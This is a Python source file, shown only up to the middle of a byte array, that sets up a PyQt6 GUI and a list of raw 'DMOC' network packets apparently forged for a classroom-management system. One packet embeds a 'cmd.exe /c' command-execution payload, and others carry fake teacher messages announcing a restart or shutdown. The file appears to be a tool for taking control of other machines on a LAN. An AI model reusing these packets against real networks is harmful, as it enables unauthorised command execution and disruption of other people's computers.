import sys
import socket
import random
import threading
import re
import subprocess
from time import sleep
from struct import pack
from os import popen, system

from PyQt6.QtCore import pyqtSignal
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLineEdit, QLabel, QPushButton, QTextEdit, QComboBox, QDialog, QScrollArea, QDialogButtonBox, QProgressBar,
    QCheckBox
)

# ----------------------------
store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91,
          0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00, 0x20, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e, 0x57, 0x2d, 0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 